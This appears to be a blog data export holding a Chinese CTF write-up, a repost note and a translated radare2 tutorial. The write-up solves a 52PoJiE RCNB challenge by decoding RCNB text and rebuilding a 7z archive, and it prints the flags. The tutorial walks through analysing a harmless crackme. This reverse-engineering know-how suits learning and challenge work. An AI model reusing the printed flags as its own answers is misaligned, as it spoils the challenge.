ȠBřĉŅƃņƃŘƈɌÇÑÞŇƄȓĉɍċňƅńþŗCřČƝƄRCņÞƝƁŔĈRȼNƅȒCnƃɌƇǹßńÞŕƈŇBŘCŕȼÑBȒÇŃÞǸƁȓȼŕČȠþȵƁȑƈńƀŔcȑƇÑßrƈǸÞrcŃÞŇƅȓćɌćńƀɍćňƀȠƅŘȼǸƁɍĊřčƞÞņƃrĊǸƀŗcȓƈńƀŇƀȐcrĊŅBȓĈȠƁɍćnƁnÞɌƇÑƃȐȼƞßŔCɍćƞbƝBȒcņƁrċnBŗƈȓȻńƃɌCÑBƞƀȒČňßŔƇřƇǹbŖcņƃŕĆňþŕČņƅȒĉŇƅȐĈŇƁȠƃRĉŔƇǸþŘĊȵßŔȼńbȑƈȠBǹBɌčȵƃrčǹƄŔȻƞƅŗȼȒĆƞƀŖĉȵbŕcƝÞȒȼńBrċǸƅŘcȠÞȐčƝbȓĊŅbŘCȠƀɍĆȠƅŕĉNƀȠÞŖćřċńƁńþȓĉȠƁƦȻnƀȓÇɍĈŅƅǸƀȓčȒȻņƀǹÞɍcȑĆȵƃrȻƝƀɌCŃþɍĈȵþŖČņßňƅŗĉÑÞŕƈȑcŃƁǸßȒƇȐÇƞßńbŕƈȵBŕƇnƄȓċȑȼȠBɍċŅÞŗċŅƃƦčńƄňÞRÇrcŅƄȐÇȠÞřčȠÞƞBɌȼɍĈŇþɍĉÑƅǸBrĆňƃŖȻŕčȵbņßŘĊƞƀȐƈnþŘčȓȻÑÞŕcńþņbŔȼɌČÑBɌčȵbȑĈŅBŕĉƞƄÑþȒÇȓȻNƀÑßŘĈÑƀȐȼƝBŔĈȵþɍĊÑßŕĉȒȼnþŕÇņbńþɍĆŅÞŗĊŃƃRċņƅŘcNþȑĆŅƁrƈǸƄȒCƝþŖȻrÇŇbřĊŅƅȑƈŃBƦċnßňƅƦĉÑþȓĈřȼŃƀɍcŃƄȵþɌCřĆNƄǹƄƦȻŔčŅƃnƅrċrCǸƄȓƈŃƀrÇnƁrCÑƅrCȵƀrƈǹßrƈȵƁRĆƞƁrÇŇÞȵßƦČȑȼǸƁǹBȑcɌƈƝÞȒĆŅÞrĆňƃRćŇƁȠƅȓcrc 这里给了一个网站，上面可以解密，得到明文md文件： 12345678910111213141516171819202122232425262728293031323334# Prove your NiubilityHello there, Welcome to the 52PoJiE Spring Festival 2019 Challenge - RCNB.To prove you are as NB as RC, complete this trial![It&apos;s dangerous to go alone, take this!](//rcnb.xyz)And the key: Which_is_N0t_Th3_Answ3rWith the trial:7z��&apos;�G�֐&apos;�l×v����2!���!$�x�Z�ˤ�XЂY�=��W�K�ï�z���������r�$]�I��q�Ib��iԎ�2C���Z�`�3��EW�w3X�� ��*2� &apos;]�Kz�,&lt;` ��5�&amp;�QT�~�z�rq+�I�1԰����r?�R���Y�5X�&lt;rA���U��[���G��^*�O- GP���l����.:�7�3��:*J(v��]��,�h����nOˁ��X�&amp;�6�=Z\\����g�h�y6I��nNJ�)�&amp;���yCE��A��#� 8��ȍr&apos;�M\\?o:��W��Va�)����D��.�5V��Gi��A��)�,~� H¬?���&amp;��V�����~_;�P|�($�e00&quot;��荈&#123;�����8�]�-1��_Z��G=�)oPd��)���w;����8zOi��|&amp;���]à�&apos;�C�q�����SD&gt;��!��b��_� |�F�-�&apos;����-�ڷ���畢&#123;�ٙ�� �ti��E��ޕ;�����[&apos;��Yl�י*b����G�1�B�����~�:�و��׉��Aenqd�)ü#�EG-:�S/�ACb_[�V�H�l=Vg�-�۴�b7&amp;���ihCz��KLE0��)��H咣BT�0(k����m�&quot;�`��b�ĥq�&lt;IU�1������\\��[�k��%���&quot;ɡ�菽a8��H��gb��Q J��ZLL���_�$�|�ɡ����R�E�wu��t7#)S�\\�����;&#123;l�W�����I�*Y��&#125;��GN�p�k*�?�2�@�S�&#125;���33���v ���/���^Ӈ��!�R�N��F��5[�2�bvX ��ߍ�E؞%���d��� ��T�@��dy��r��B� ��?aHx�����&quot;�g����呴^+��|t$&#125;�x�C.���bp�X�lU|��&amp;׶��&#125;(���O�eq8s=店�C�#^�c�Q��&gt;�8��^���֙���b6&amp;��i�5FT�m$5�|�X�tA���s��&#125;��.h���Y��r�&#125;�(�,�&lt;W���V�����`�V08K�� -V�CV��&#125;�~d��� 0�y�� q����wWxZe��#q&quot;�״�=�%��h�!��_�������#��ᷫDA8^kJqɊ�=E�&#123;%�m&gt;��k� p $�SL˓`��]y bv�� 最后面给出的trial看开头显然是个7z，那上面的key应该就是密码了。我把它存为一个新文件，然而这个字符�严重干扰了我好几个小时，让懵逼的我一度以为这是题目设计的加密。一开始我xxd了一下文件，发现有三个字节efbfbd频繁出现505次： 根据7z文件头377a bcaf 271c 0004尝试过替换，一度以为掉进了脑洞的陷阱。直到我看到这篇文章，才知道这串字节就是那个字符。 后来在github上找到了rcnb的源码，修改js，将明文每个字节以int的形式输出，再用python一跑拿到压缩包： 123456789function printRes(str) &#123; var res=rcnb.decode(str) for(var i=0; i&lt;res.length; i++) &#123; console.log(res[i]) &#125; // console.log(res)&#125;printRes('ŘĈÑƀƝƄŘȻŖĊǸƀrcnƃňßɍĉƞƀRČņbRÇrcnbrcnbrcnbŖĊƝƃrcnbrcnbrcnbrČNþȓĉƞƁnƅŔƇńÞrćǹƁȓĆÑƅŔȼŕÇƞƅƞßȐCŅƁȐƇŖĆňƁɌƇȵƃȑĈȠƃNƃƦčƝƄȓĉŕČňƃŇbȐĆȑćnƅŘȼȵßƞßRĆǸƄɌCƞBȑĊŅÞŗĊɌȼŃßŇƁŔcŔƈǹÞȠƁɌĆńƅɍĉƝÞŖÇɌcŇƅŖĆnþńƁȓČňƄŘȻȓȻnƃǸƁɌCȒćȵƁȵƄɌCŅƅȐčŃƀřCřƇŇƁǸþřÇƞbƦČnbRCƝßȐćǹƁŔȻřȻņBǹBȑċŗÇƞƃȠBɌĆÑƃŕčņƃȓƇńbŖčÑbɌĊŗƈÑBRcƞƁȑƇńÞƦČǹƀǸƀŘcŘȻnƅRCņƃŅƄȐĉNÞŘĈÑƄŕčȐćǹbŇÞȓćǹßɌĈŔȻňƀƝbȐÇrCǹÞȓȻŃBńƄɍċńbɌČŗƇnƅȵƀŗċņßRCŇbřČřćÑƀȐĊŃbǸƅɍcȑCȵbǸßȑƇȑCǹƅŘȻŃƃřċŃþnƄRċǹBrƇńƃŖĈȑĉņbƞƅƦĆrCƝÞƦĆÑBņƄrćȑƇÑƅńƄƦƇŗĆnƀŔĆȠƄȐćNƀÑƅƦȼȓĉŇƄȵßȑCǹƄȐȼŗćȠƃŅBȓCȠƁŔċƝßřcŘčŅbƦĊƝƃɌċƞƀnƁŘȻÑbŖčŗCnþȒȻÑƅNþřȼrƈNƁŕĆƝBȐÇňƅȐCŃßŅƄrćƞƀȓĊńƃŖƇǸƁřċŘćŃƁŘȼÑƅȑċȵƀŃþrƇŃßŕĉrćNþȒȻƝƁɌƈȠbƦĊNƅŔCƝßȓČńÞƦċŇbŖƈņƃŖĉȵþnƃɍĉɌƈňÞřčǹBȠbŕĉřċńþņƄȑÇƞƁȒcŘĉǸƅňƃȒcŔĈńßǹƁƦćȓȼǹƁÑƁƦCȑċŇƄȓƈnƄȵƄrcŘčnƃȵßRčȑcNƁrĊNƅȐÇŇƁņƁȒčnƀɌČňbɌĆrȼƞÞŇƃɌCřÇnþňƅȒȼƝBȑcȐȻnBňƁȑċȓcȠbǹþȑƇǹƁrĈŖƈňƁŗcȵbňþřȼƦĈŃƅňßŗcŃƀƦĊŔcńÞŖĉȠƅŃƁȑĊȐÇȠþƞÞɌƇȵƅȐȼɍĉÑBrƇŇƅŔčƞßnƅŗĈɍĆȵƅŖČņbŖĆȠÞȒċÑƃŗċNƃŕȻŃÞNÞŔčŕĆƞƃNƃRČȐĆņƁŃƀřċŃbȓčƝƃȑcŔĆNþȑčȠbŗĆNþŇƁȓčrčŃƄȑĉnþŅþȓȻřcÑƄŖƇÑßȐĆńbŅbŕĊŃßŕČŇÞȒcÑƁȑĆŘÇńƃRƈǸƅŕcȠbņÞȑċRƈŇƀȐcňþńÞƦĈɍCȠƀÑBRĉǸƁŗȼȑƇnƁȵßŕƇŖċƞƅřƇǹþŇƄŖÇȠƃRĈǸƅŕƇņþŔĊřƈňbƝßrƈŕÇǸþŃÞȐĆnbȑĉȑȻǸƃǹƀRƇrƈNbnƄrċrĉŅBƦcňþRċňƁnBŗȼÑƁŕċƞßɍĈŗćņƀǹƁȑĈŅþŔƇňƅŗƇrĊǹƄǸßȒƈǹßŕȻȠBŔćƝþŔȻÑBȓĆǸÞȑċŕĉŃþŃƀŘcřȻÑBŅƀɌƈńƄŔĊÑÞƦĈƞƃȓȼņƁŘȻnƄŔćŖċǸƄŅBŖÇȓĉŅBňƄȐȼŖÇņbǹƅrȻÑÞŔČŅßŔĊNþɌƇȠÞRĉnþřčŕċNþȠþƦȼȠƅRĆÑƄŗćŘčŃƄŖÇÑƄǹbȑĆŖÇǹþƞƄȓcƞƁRCǸƄɍćȒČNƅȓȻňÞņBRĆƞbřƇŖcȠbřȻńƄŗĆŃÞŃBƦĉŗĊNþřĊņßȒĆȠƁȑĊŅBȐƈȵBǹƁřcrĉƞbnƀƦċŘȼÑƀȒÇńƁŗCȠƁƝßrĊǹþŗȻŃƀȒȻɍċNßŖĉǸßŃÞrƇȒȼȠƃřƇŃƃNbŘċƦČňƅŔČnBŗČƞbƞßŔȼŔĊȠƀnƅŖċŕčŇƄǹBŔCřċǹƅȐČňƀƝƀřĈŖČȵßńÞɌCǹƃŔćȓċÑþŕȼƝƄȒcńbǹbȓƈƝƅɌĆȠƄŖćǹBŖƈŘÇƝƅƦĉŃƁŃßŖĉNƃŔĉÑƄŖĈƞþȑČȑČnBŃƁŔČnƃȒĈȓĈNBǸßȐCȠßȐčŅbɍĉƞþƦĉrȻŅBŇßȒȻǸƁŘȼŘċńBňbŘčnƄŘÇȒƈŇƅǹÞřćȐćŅÞƦċŇƄŇbɌƇƦƇńƀňƁrČRČņbȑÇŅßȵƅřȼŖĆǸƀŔCƝƀņÞȓƇrĊŇþňbŕÇŃƄŔƈńÞŘČȐĊƝbřȻǹƃɌČȠBńƄȒƇNþřĊɌćņBŕȼȠƃŖƇňþÑßȓȼȑČÑƅnƄɍĉnÞŗcŘƈňßȓĉȵƄȑcNbȠßƦÇŅƃɍĈƦĊnƁŖÇŅBŔcŃƁńƁɌċňÞŕĉƦCņƅƦȻȵƅȓÇǹƃȓĆȠƃRȻňƃřćǸƀŗƈǹßřĉňbȐČńƁɍĈŇÞÑÞŘćŗÇNbŗȻÑÞRƈǸƃǹƀŕȻRĉƞBńþŘȻŔĆƝƁņBŕȻNBRĉņƃȓČƝƁȐċÑƀRČŕƈňƀrčŇƅȐĊŅÞƦȼǹƁňƃȓĊnþřĈŘCnþȠƀȒcƞƃɌćɌĊȵƅŕƇňƃnƄŔčńÞRČřȼńbŇßŕĊňþŘCǹbŔĈnbŕĊńþȑcŃƄŔĈŔčńbȐčȠBřĉŅƃņƃŘƈɌÇÑÞŇƄȓĉɍċňƅńþŗCřČƝƄRCņÞƝƁŔĈRȼNƅȒCnƃɌƇǹßńÞŕƈŇBŘCŕȼÑBȒÇŃÞǸƁȓȼŕČȠþȵƁȑƈńƀŔcȑƇÑßrƈǸÞrcŃÞŇƅȓćɌćńƀɍćňƀȠƅŘȼǸƁɍĊřčƞÞņƃrĊǸƀŗcȓƈńƀŇƀȐcrĊŅBȓĈȠƁɍćnƁnÞɌƇÑƃȐȼƞßŔCɍćƞbƝBȒcņƁrċnBŗƈȓȻńƃɌCÑBƞƀȒČňßŔƇřƇǹbŖcņƃŕĆňþŕČņƅȒĉŇƅȐĈŇƁȠƃRĉŔƇǸþŘĊȵßŔȼńbȑƈȠBǹBɌčȵƃrčǹƄŔȻƞƅŗȼȒĆƞƀŖĉȵbŕcƝÞȒȼńBrċǸƅŘcȠÞȐčƝbȓĊŅbŘCȠƀɍĆȠƅŕĉNƀȠÞŖćřċńƁńþȓĉȠƁƦȻnƀȓÇɍĈŅƅǸƀȓčȒȻņƀǹÞɍcȑĆȵƃrȻƝƀɌCŃþɍĈȵþŖČņßňƅŗĉÑÞŕƈȑcŃƁǸßȒƇȐÇƞßńbŕƈȵBŕƇnƄȓċȑȼȠBɍċŅÞŗċŅƃƦčńƄňÞRÇrcŅƄȐÇȠÞřčȠÞƞBɌȼɍĈŇþɍĉÑƅǸBrĆňƃŖȻŕčȵbņßŘĊƞƀȐƈnþŘčȓȻÑÞŕcńþņbŔȼɌČÑBɌčȵbȑĈŅBŕĉƞƄÑþȒÇȓȻNƀÑßŘĈÑƀȐȼƝBŔĈȵþɍĊÑßŕĉȒȼnþŕÇņbńþɍĆŅÞŗĊŃƃRċņƅŘcNþȑĆŅƁrƈǸƄȒCƝþŖȻrÇŇbřĊŅƅȑƈŃBƦċnßňƅƦĉÑþȓĈřȼŃƀɍcŃƄȵþɌCřĆNƄǹƄƦȻŔčŅƃnƅrċrCǸƄȓƈŃƀrÇnƁrCÑƅrCȵƀrƈǹßrƈȵƁRĆƞƁrÇŇÞȵßƦČȑȼǸƁǹBȑcɌƈƝÞȒĆŅÞrĆňƃRćŇƁȠƅȓcrc'); 1234567891011#!/usr/bin/env pythonf = open('plain_array.txt', 'rb')t = f.read()f.close()data = t.split('\\n')[:-1]print len(data)# print dataf = open('trial.7z', 'wb')for i in range(len(data)): f.write(chr(int(data[i])))f.close() 解压后拿到一个新文件nb，还是被加密了的： 1ȐȼŃƁȓĉnƅŕƇŅƀȓƇŃƅȒċƝþŕƇNƄɌćŃÞɌCȵBȒČNƄɌCňƀɌćÑbȒCŅÞŕƇŇƁȓƇńƁŕƇŅƅȒCņbȒċƝÞȒƈƝƀȒČnƁɌćŃÞȓƈȠƅȓƇNþɌcńBȓĊǸƁȒȼȵbȒƈnbɌCȵßȒȼȠÞȓĉNƁŗćƝƅRćŇbƞƅRȻÑßŘȻŇƁrĊńßŕčȠþRĉNƁƦĈņBƦcǹÞƦćŃbƦĈNƁƦĈȒćƝÞnƅŔĆņÞrȼȒćƝþǸßRĊńþrȻNþrČńßŕčǸÞRĊȵÞrȼȵbŕƇŇÞrĊnÞŔĆnBŘÇƝƃrĉǹþƦćņƅƦcȵƀƦćņBƦcǹÞƦćŃbƦĈNƁƦĈȒćƝÞnƃŔĆǸþRĊƝƃrĉňÞƦĉřƇƞþȵƅrȼņbrCnƃŔĆņßRćńßrȻńßŕčŃBRĊƞƅřȻƞƀřƇǹþƦćȵÞřƈƞþřȻŅþƦcǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞßřȻņƁƦcǹþƦćņƄƦcƞƄřȻņBƦcǹÞƦćŃbƦĈȵƀƦćȒćƝÞŃƄŔCƞÞřȻŅþƦcňÞƦĉřƇƞþȵƅrȼņbrCŃƄŔCƞßřȻŅÞƦcǹÞƦćȵƄřƈȵƀƦćŅÞƦcňÞƦĉȵƁřƈŅßřƇȒćƝþŃBRĊƞßřȻņƀƦcňÞƦĉȵƄřƈƞÞřȻņƀƦcǹÞƦćNþƦĈƞƅřȻņƀƦcňÞƦĉȵƄřƈƞþřȻŇbřƇǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞƄřȻȒćƝÞnƃŔĆǸþRĊŇƅrĊŃBrČŃƃŔċńþrȻŅbrċǹÞƦćȵÞřƈȓčnÞnƅrćǸƃŔćÑþŘȻȠBŘĊȵƅŕċRćņßƝƃŔƇȵƅrƇŅÞƦcǹÞƦćȵƁřƈȓčnƄNþřĆŃƃŔċÑƀrÇƞƀřƇǹþƦćņƄƦcƞƅřȻņƁƦcňÞƦĉņƄƦcňßƦcņƀƦcǸßřȻȵƃřƈňßƦcŇBřƇǸƄřȻņƄƦcȵƀƦćȒćƝÞǸbŔćňÞRČNƅŘCǹÞƦćŃbƦĈňÞƦcƞƀřƇǸƄřȻȒĉŅBǹÞrčȠbrčŅÞŔcÑƃRCȵbŕƇnƅrćŃƄŔCƞßřȻŅÞƦcňÞƦĉȵƁřƈƞƄřȻŇbřƇňÞƦĉȵƁřƈŅßřƇŇBřƇǸƁřȻņƄƦcƞßřȻƞƀřƇǹþƦćȵÞřƈÑbřȻřČȵßǸÞRĊǸþRĊǹÞrčȠbrčǸbŔćņþRćȠƃŘĊŃƄrČŃBRĊƞƅřȻņƀƦcǸƁřȻņƄƦcƞƅřȻƞƀřƇǹÞƦćȵƀřƈNƁƦĈƞƀřƇňÞƦĉȵƄřƈƞþřȻŇbřƇǸƁřȻņƄƦcƞƄřȻņBƦcǸßřȻȵþřƈȵƀƦćȒćƝƄȵƅŔȻNƅRĉǸƅŘCņbrCȠBŔĆŅßřƇřČȵƁȵƅŔȻńþrȻƝƃrĉǸƃřȻȵÞřƈNƁƦĈņBƦcňÞƦĉȵƁřƈŇbƦĆŅÞƦcǹþƦćņƅƦcȵƀƦćŇBřƇǸƅřȻȵþřƈƞßřȻņƀƦcǸƄřȻȵƄřƈȵƀƦćņƀƦcǹÞƦćŃbƦĈNƁƦĈņƁƦcǹÞƦćNþƦĈƞßřȻřČȵƅnƃŔĆƝƃrƈǹƀŕĉŇÞrĊnƃŔĆȵƁrȼņbŔcŃƃrČǸbŔćņßRćÑƀrƇǸßřȻņƄƦcƦȼŇƅnßrćǹbRĊŅbrȻǹÞŕĊňÞƦĉřƇÑbǸþŕĉńƅŕčƞƀRȻÑBRCƝBrƈŃbřĆŃÞŖĊnƀŘÇǹƀŕĉŇƄrĊƝƃŔƇȵƄrȼŃƀrČņBrCȠþRĉňßƦcřċÑƅRĆŇþŖƇŃÞǹƅƦćȒĉŅBȵƁrȼňßŕċȠßŔčƞßřȻņƁƦcǹÞƦćřƇƞþǹÞrčņbrCnƃŔĆÑƃRCȵbŕƇņbrCnÞŔĆnBŘÇŇƅrĊŃƄrČŃBRĊƞƅřȻņƀƦcǸƃřȻȵßřƈƞßřȻƞƀřƇǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞßřȻƞƀřƇǹÞƦćȵÞřƈƞƄřȻŇBřƇǸƅřȻȵþřƈƞƅřȻȒćƝƅŃÞŖĊnBŘÇŅbrȻȠBrčǸÞRĊǸßRĊŅßŔcŃƁřĆǹbRĊȵßrȼƞbŘČŇþrĊǸÞRĊÑBRCǹƄrčńƅŕčŃƄŔCƞßřȻņƁƦcǹÞƦćȵÞřƈȓČŃƅƝƅƦcNþƦĈňßƦcņBƦcǹßƦćńßřƇňßƦcņƀƦcǸƅřȻřčȠbŅþƦcǹƅƦćȵƄřƈƞÞřȻƞƀřƇ 然后一层层解密拿到key： 1234567Well done! It seems that you have great programming skills.ȐȼŃßɌCȵƃȒȼȵbȒƈnbɌÇńßɌĈȠƃȒȻŃBȓƈȠƃȒȼȵbȒČŃBɌCňƀȒĊŇßɌcńþȓČŇƁŕƇņÞȒȻŃƄŕƇŅƅȓƇŃƃȒȼȠbȒCņƁɌCňƀȒCŅƀȒĉȠƀɌćÑbɌcŅƄɌĉņƄȒȻńƄɌĉŇÞŕƇņÞȒȻŃƄŕƇŃbȒČŃƄŕƇńBȒČnƁȓȼǸßŗĆnƀȒćnþŕƇnþȓƇńƅɌƇƝƄřĈƝßŗƇȠbȓčȵbȒȼƞþŗcŅƅȑĉȠƁȒCŅƀɌćŃÞɌćÑßŕƇŅþȓČňBɌČŅƅȓĊǸƄɌcńƄŕƇńþȒĆȵþɌĉŇÞŕƇŃƃřčȠbřċȵƀȓCÑBřćŃBŖČȵƃɌćǸƀȓƈȠßŘčŅƄŗĉȠƄȒȼȵƅȒȻŅBȒĆƝƃȒĈÑƄȓĊņBřƇNƁɌƇƞbɌCƝßȐĉņþƦȻƝƃŗĈńƀɌCƝB;) ȐcňÞŗcŅƅȒCŅƀȒĉȠƀȒȻŃƄɌcńƄŖċŅþŕƇņÞȒȻŃƄŕƇŅþȒČŃßŘčńbƦȻŇƅɌČÑþɌƈǹƃɌĉŅßȒCŅƅȒČnBƦȻƝƃȑÇƝƄŘCNƁȐĉņþ 1234567Well done! It seems that you have great programming skills.Wishing you happiness during the holidays and throughout the New Year!- by Coxxs@52PoJiE, [Want to know more about RCNB.js?](https://github.com/Coxxs/RCNB.js);) Oh, and here&apos;s the key: N0w_y0u_are_NB_A5_RC 感谢的话最后感谢吾爱破解大佬们的辛勤付出！ 参考网站https://github.com/Coxxs/RCNB.jshttps://travis-ci.com/Coxxs/RCNB.jshttps://liudanking.com/golang/utf-8_replacement_character/https://www.52pojie.cn/thread-873265-1-1.html","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://qianfei11.github.io/tags/wp/"},{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"}]},{"title":"【转】Installing Minimal Ubuntu for REMnux","slug":"【转】Installing-Minimal-Ubuntu-for-REMnux","date":"2019-02-20T14:10:38.000Z","updated":"2019-02-28T05:33:23.018Z","comments":true,"path":"2019/02/20/【转】Installing-Minimal-Ubuntu-for-REMnux/","link":"","permalink":"https://qianfei11.github.io/2019/02/20/【转】Installing-Minimal-Ubuntu-for-REMnux/","excerpt":"因为google drive上下载REMnux的ova实在是太慢了，在官方文档上看到了可以用ubuntu来弄。这里记录一下安装Ubuntu 14.04 64-bit minimal ISO的过程。搬运自这里。","text":"因为google drive上下载REMnux的ova实在是太慢了，在官方文档上看到了可以用ubuntu来弄。这里记录一下安装Ubuntu 14.04 64-bit minimal ISO的过程。搬运自这里。","categories":[],"tags":[{"name":"repost","slug":"repost","permalink":"https://qianfei11.github.io/tags/repost/"}]},{"title":"【译】Radare2之旅-Part1：Simple crackme","slug":"【译】Radare2之旅-Part1：Simple crackme","date":"2019-02-18T04:17:27.000Z","updated":"2019-02-28T05:32:04.386Z","comments":true,"path":"2019/02/18/【译】Radare2之旅-Part1：Simple crackme/","link":"","permalink":"https://qianfei11.github.io/2019/02/18/【译】Radare2之旅-Part1：Simple crackme/","excerpt":"翻译自Megabeets。","text":"翻译自Megabeets。 序言过去一年里的CTF比赛中，不论是逆向工程（RE）还是漏洞挖掘（PWN），我一直在用radare2。我发现radare2对于很多CTF的题目来说都很有用，极大地缩短了我的做题时间。遗憾的是熟悉radare2的人太少了。可能大家都习惯了使用IDA Pro、OllyDBG还有gdb，或者没有听说过它。不管怎么样，我都认为radare2应该成为你工具箱中的一部分。 因为我真的特别喜欢这个项目，而且我希望能有越来越多的人开始熟悉它、使用它，能对项目做出一些贡献。我计划写一系列的文章以及使用r2的例子。因为那些文章都涉及radare2的特点和功能，我会解释的更加详细。 radare2radare2是一个逆向工程和二进制分析的开源框架，它有很多命令行接口，包括反汇编、分析数据、打补丁、比较数据、查找、替换、可视化等等功能。同时它可以在几乎所有的主要操作系统（GNU/Linux、.Windows、*BSD、iOS、OSX、Solaris等等）上运行，并且支持许多CPU架构和文件格式。他所有的特点可以展现出一个思想——radare2是绝对自由的。 该框架是一个工具的集合，既可以在r2给出的shell下使用，又可以独立使用——比如我们将要了解的rahash2、rabin2、ragg2三个组件。所有的组件赋予了radare2强大的静态或动态分析、十六进制编辑以及漏洞挖掘能力（在接下来的文章中我会更深入地讲述）。 我们必须意识到学习r2是一个十分艰难的过程——虽然r2有GUI和WebUI。在我看来，IDA的GUI和方便性确实更佳。但是它的命令行接口，包括其可视化模式，仍然是radare2的核心以及魅力所在。因为它的复杂性，我会尽力讲得浅显易懂。 在开始之前，你可以看一看“r2、IDA Pro和Hopper等工具间的比较”来了解它。 获取radare2下载radare2的环境配置非常快——我们每天都会更新，所以更推荐你去使用git的版本，而不是稳定版本。有时候稳定版本可能没有git版本更稳定。 123$ git clone https://github.com/radare/radare2.git$ cd radare2$ ./sys/install.sh 如果你不想下载git版本或者你想要不同操作系统（Windows、OS X、iOS等等）上的可执行文件，可以在radare2官网下载界面查看。 更新正如我之前所说的，更推荐大家使用git仓库里最新版的r2。从git更新r2只需要执行： 1$ ./sys/install.sh 然后你就能从git获得最新的版本。我通常每天早上会更新一下radare2，在这期间可以看看一会儿视频消遣。 卸载我实在想不出什么理由会让你在看这篇文章时想要卸载radare2。如果要卸载的话只需要执行： 12$ make uninstall$ make purge 开始学习你可以在这里下载Crackme。 现在你已经在自己的系统上下载了radare2和文件，我们可以开始探索radare2的基础使用。我会在REMunx上调试，大部分的命令和说明跟Windows或者其他系统上是一样的。 命令行参数和大部分命令行工具一样，查看可选参数的方式是执行-h参数： 1$ r2 -h 我不把完整的输出放上来，而是放一些我日常工作中常用的参数： 12345678910111213Usage: r2 [-ACdfLMnNqStuvwz] [-P patch] [-p prj] [-a arch] [-b bits] [-i file] [-s addr] [-B baddr] [-M maddr] [-c cmd] [-e k=v] file|pid|-|--|= -d: Debug the executable 'file' or running process 'pid'-A: Analyze executable at load time (xrefs, etc)-q: Quiet mode, exit after processing commands-w: Write mode enabled-L: List of supported IO plugins-i [file]: Interprets a r2 script-n: Bare load. Do not load executable info as the entrypoint-c 'command; command; ...': Run r2 and execute commands (eg: r2 's main; px 60')-p [prj]: Creates a project for the file being analyzed-: Opens r2 with the malloc plugin that gives a 512 bytes memory area to play with 二进制信息面对一个新的文件时，我第一件想做的事就是获取文件的信息。我们可以使用r2框架中最强大的工具之一——rabin2来获取信息。 rabin2可以从二进制文件中获取信息，包括区段、文件头、导入导出表、字符串、入口点等等。同时具有不同的格式的输出。rabin2支持ELF、PE、Mach-O、Java CLASS等文件。 使用man rabin2查看更多的信息。 我们执行rabin2并使用参数-I输出二进制信息，例如操作系统、语言、字节序、框架以及保护技术（比如Canary、PIC、NX）等等。 123456789101112131415161718192021222324252627$ rabin2 -I megabeets_0x1havecode truepic falsecanary falsenx falsecrypto falseva trueintrp /lib/ld-linux.so.2bintype elfclass ELF32lang carch x86bits 32machine Intel 80386os linuxminopsz 1maxopsz 16pcalign 0subsys linuxendian littlestripped falsestatic falselinenum truelsyms truerelocs truerpath NONEbinsz 6220 你可以清楚地看到，这是一个32位elf文件，没有符号表并且是动态链接。它没有任何漏洞利用技术——下一篇文章我们讲学习使用radare2来对漏洞进行利用。让我们跑一下程序，看看它做了什么。 注意：虽然我可以向你保证这个程序是安全的，但是逆向一个未知的程序时，务必在一个虚拟环境下运行。 不过你可以相信我，因为程序确实是安全的。😛 1234567891011$ ./megabeets_0x1 .:: Megabeets ::.Think you can make it?Nop, Wrong argument. $ ./megabeets_0x1 abcdef .:: Megabeets ::.Think you can make it?Nop, Wrong argument. 第一次跑的时候，输出了Nop, Wrong argument。假设我们需要提供一个参数，第二次输入abcdef作为参数，依旧失败了。显然需要特定的字符串才能绕过。 让我们用radare2来测试程序： 123$ r2 ./megabeets_0x1 — Thank you for using radare2. Have a nice night![0x08048370]&gt; 我们生成了一个radare2的shell，还有一个欢迎界面。我们可以执行fo来输出一个新的句子，有些很搞笑同时有些也很有趣。现在r2的shell正在等着我们输入命令，并且展示给我们此刻所在的地址（0x08048370）。默认情况下我们自动在入口点处。让我们看看是否正确： 123[0x08048370]&gt; ie[Entrypoints]vaddr=0x08048370 paddr=0x00000370 baddr=0x08048000 laddr=0x00000000 haddr=0x00000018 type=program1 entrypoints 我们使用ie命令输出了文件的入口点地址。r2命令有一系列有意义的字母。在这个例子里，ie代表了info &gt;&gt; entrypoint。因此在你熟悉了radare2的能力之后，命令都是比较好记的。但是你不需要记住所有的命令——你可以仅仅需要在（几乎）每个字母后面加上?来获得命令的信息以及它的子命令。 12345678910111213141516171819202122232425262728293031323334[0x08048370]&gt; i?|Usage: i Get info from opened file (see rabin2’s manpage)| Output mode:| ‘*’ Output in radare commands| ‘j’ Output in json| ‘q’ Simple quiet output| Actions:| i|ij Show info of current file (in JSON)| iA List archs| ia Show all info (imports, exports, sections..)| ib Reload the current buffer for setting of the bin (use once only)| ic List classes, methods and fields| iC Show signature info (entitlements, …)| id Debug information (source lines)| iD lang sym demangle symbolname for given language| ie Entrypoint| iE Exports (global symbols)| ih Headers (alias for iH)| iHH Verbose Headers in raw text| ii Imports| iI Binary info| ik [query] Key-value database from RBinObject| il Libraries| iL List all RBin plugins loaded| im Show info about predefined memory allocation| iM Show main address| io [file] Load info from file (or last opened) use bin.baddr| ir|iR Relocs| is Symbols| iS [entropy,sha1] Sections (choose which hash algorithm to use)| iV Display file version info| iz Strings in data sections| izz Search for Strings in the whole binary| iZ Guess size of binary program i命令目的是从打开的文件中获取信息，它就是集成到radare2的shell里的rabin2（之前提到的）。 分析默认情况下radare2不会自动分析文件，因为分析文件是一个复杂的过程，尤其是比较大的文件。了解更多关于分析的内容，你可以看一看在radare2博客上的这篇文章。 显然分析仍然是可能的，r2提供了许多种类的分析方式。正如我之前提到的，我们可以通过对a命令后面添加?来查找分析选项。 1234567891011121314151617181920212223242526[0x08048370]&gt; a?|Usage: a[abdefFghoprxstc] […]| ab [hexpairs] analyze bytes| abb [len] analyze N basic blocks in [len] (section.size by default)| aa[?] analyze all (fcns + bbs) (aa0 to avoid sub renaming)| ac[?] [cycles] analyze which op could be executed in [cycles]| ad[?] analyze data trampoline (wip)| ad [from] [to] analyze data pointers to (from-to)| ae[?] [expr] analyze opcode eval expression (see ao)| af[?] analyze Functions| aF same as above, but using anal.depth=1| ag[?] [options] output Graphviz code| ah[?] analysis hints (force opcode size, …)| ai [addr] address information (show perms, stack, heap, …)| ao[?] [len] analyze Opcodes (or emulate it)| aO Analyze N instructions in M bytes| ar[?] like ‘dr’ but for the esil vm. (registers)| ap find prelude for current offset| ax[?] manage refs/xrefs (see also afx?)| as[?] [num] analyze syscall using dbg.reg| at[?] [.] analyze execution tracesExamples:f ts @ 